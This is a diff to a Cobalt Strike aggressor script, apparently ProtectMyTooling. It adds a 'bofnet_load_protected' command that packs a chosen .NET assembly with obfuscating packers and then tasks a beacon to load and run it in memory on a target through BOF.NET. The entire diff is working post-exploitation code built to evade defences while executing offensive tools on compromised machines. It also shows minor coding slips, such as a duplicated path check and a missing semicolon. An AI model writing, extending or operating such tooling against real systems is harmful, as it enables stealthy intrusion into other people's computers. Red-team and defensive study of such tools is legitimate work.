@@ -65,6 +65,11 @@ beacon_command_register(
     "Use: protected-upload </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary
 process and loads the assembly into it.\n\nIf the file about to be uploaded is a valid PE .NET executable, it will be firstly subject for multi-packer.py script that would pass the file to configured .NET packers. Generated output artefact would then be uploaded to the target machine.");
 
+beacon_command_register(
+    "bofnet_load_protected",
+    "Protects .NET assembly with ProtectMyTooling and loads protected version via BOFNET bofnet_load.",
+    "Use: protected-upload </path/to/file.exe|filename> [arguments]\n\nProtects .NET assembly with ProtectMyTooling and loads protected version via BOFNET bofnet_load.");
+
 sub interpretSize {
     local('$s $size');
     $s = $1;
@@ -113,6 +118,113 @@ sub checkBofnet {
         if($checkedBofNetSoFar > $checkBofNetTimes) {
             show_error("There is no BOF.NET loaded in Cobalt Strike! Load bofnet.cna or reload ProtectMyTooling.cna to use protected-execute-assembly");
         }
+    }
+}
+
+alias bofnet_load_protected {
+    local('$bid $localpath $args $generatedlocalpath');
+    $bid = shift(@_);
+    $localpath = shift(@_);
+    $args = join(" ", @_);
+
+    $useBofnet = true;
+
+    if($has_bofnet_commands == true) {
+        $useBofnet = true;
+    }
+    else {
+        checkBofnet();
+        if($has_bofnet_commands == false) {
+            berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and ProtectMyTooling.cna before using this.");
+            return;
+        }
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
+            bupload($bid, $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($bid, "Assembly path must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        if(strlen(%options["dotnet_assemblies_directory"]) > 0) {
+            if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath)) {
+                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath);
+            }
+            else if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe")) {
+                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe");
+            }
+            else {
+                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
+                return;
+            }
+
+            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
+        }
+        else {
+            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ )");
+            return;
+        }
+    }
+
+    try {
+        $generatedlocalpath = executePacker($1, $localpath);
+    }
+    catch $message {
+        berror($bid, "Could not generated protected variant of file to be uploaded. Error: $message");
+        return;
+    }
+
+    $algo = "MD5";
+    $md = [java.security.MessageDigest getInstance: $algo];
+    $digest = 0;
+    $hash = "";
+
+    try {
+        $f = openf($generatedlocalpath);
+        $content = readb($f, -1);
+        if($content is $null) {
+            berror($1, "Could not generate protected version of file to be uploaded. Please review logfile.")
+        }
+
+        $digest = [$md digest: $content];
+        $hash = transform($digest, "hex");
+        $hash = lc($hash);
+
+        closef($f);
+    }
+    catch $message { 
+        berror($1, "Could not read contents of file to upload. Error: $message (file path: $generatedlocalpath )");
+        return;
+    }
+
+    if(strlen($hash) == 0) {
+        btask($bid, "Tasked beacon to load protected .NET program via BOFNET: \c7" . getFileName($generatedlocalpath) . " $args \o");
+    }
+    else {
+        btask($bid, "Tasked beacon to load protected .NET program via BOFNET (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
+    }
+    
+    if($useBofnet)
+    {
+        if(strlen($hash) == 0) {
+            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+        else {
+            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+
+        binput($bid, "bofnet_load $generatedlocalpath");
+        fireAlias($bid, "bofnet_load", $generatedlocalpath);
+        
+        binput($bid, "bofnet_jobassembly " . getFileName($generatedlocalpath) . " $args");
+        fireAlias($bid, "bofnet_jobassembly", getFileName($generatedlocalpath) . " $args");
     }
 }
 
